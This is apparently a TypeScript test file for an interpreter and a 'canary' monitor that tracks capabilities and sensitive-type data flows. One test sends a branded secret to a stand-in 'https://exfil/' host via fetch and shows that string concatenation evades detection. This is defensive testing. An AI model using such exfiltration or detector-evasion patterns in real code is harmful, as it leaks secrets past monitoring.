import { test } from "node:test";
import assert from "node:assert";
import { interpret, createTypedProgram, typeOfNode } from "../../src/index.ts";
import { runCanary } from "../../src/canary.ts";
import ts from "typescript";

test("enum: numeric members auto-increment with a reverse mapping", () => {
	assert.strictEqual(interpret(`enum E { A, B, C } E.A + E.B + E.C`), 3);
	assert.strictEqual(interpret(`enum E { A, B } E[1]`), "B");
	assert.strictEqual(interpret(`enum E { A = 1, B, C = 10, D } E.B + E.D`), 13);
});

test("enum: string members and references to prior members", () => {
	assert.strictEqual(interpret(`enum Color { Red = "r", Green = "g" } Color.Green`), "g");
	assert.strictEqual(interpret(`enum E { A = 1, B = A * 10 } E.B`), 10);
});

test("type-only declarations are erased at runtime", () => {
	assert.strictEqual(interpret(`type T = number; interface I { x: number } const n: T = 5; n`), 5);
});

test("TypeChecker resolves the static type at a node", () => {
	const { checker, sourceFile } = createTypedProgram(`const u = new URL("https://x"); const s = "hi";`);
	const types: string[] = [];
	const visit = (n: ts.Node): void => {
		if (ts.isVariableDeclaration(n) && n.initializer) types.push(typeOfNode(checker, n.initializer) ?? "?");
		n.forEachChild(visit);
	};
	sourceFile.forEachChild(visit);
	assert.ok(types.includes("URL"), `expected a URL type, got ${types.join(", ")}`);
});

test("type-aware canary annotates each reach with its resource argument's static type", () => {
	const r = runCanary(`const u = new URL("https://x"); fetch(u);`, { predicted: ["net"], useTypes: true });
	assert.ok(r.ok);
	assert.strictEqual(r.observed[0].valueType, "URL");
});

test("type-directed: a value of a sensitive type flowing into a sink is flagged", () => {
	const code = ["type Secret = string & { readonly __brand: unique symbol };", `const secretUrl: Secret = ("https://s" as Secret);`, "fetch(secretUrl);"].join("\n");
	const r = runCanary(code, { predicted: ["net"], sensitiveTypes: ["Secret"] });
	assert.strictEqual(r.sensitiveFlows.length, 1);
	assert.strictEqual(r.sensitiveFlows[0].valueType, "Secret");
});

test("type-directed: string concatenation launders the brand (no false positive)", () => {
	const code = ["type Secret = string & { readonly __brand: unique symbol };", `const secretUrl: Secret = ("https://s" as Secret);`, `fetch("https://exfil/" + (secretUrl as string));`].join("\n");
	const r = runCanary(code, { predicted: ["net"], sensitiveTypes: ["Secret"] });
	assert.strictEqual(r.sensitiveFlows.length, 0, "concatenated string is not the sensitive type");
});

test("type-aware runs still catch capability divergence", () => {
	const r = runCanary(`import fs from "node:fs"; fs.writeFileSync("/x", "y");`, { predicted: ["net"], useTypes: true });
	assert.ok(r.aborted);
	assert.strictEqual(r.divergence?.capability, "fs:write");
});
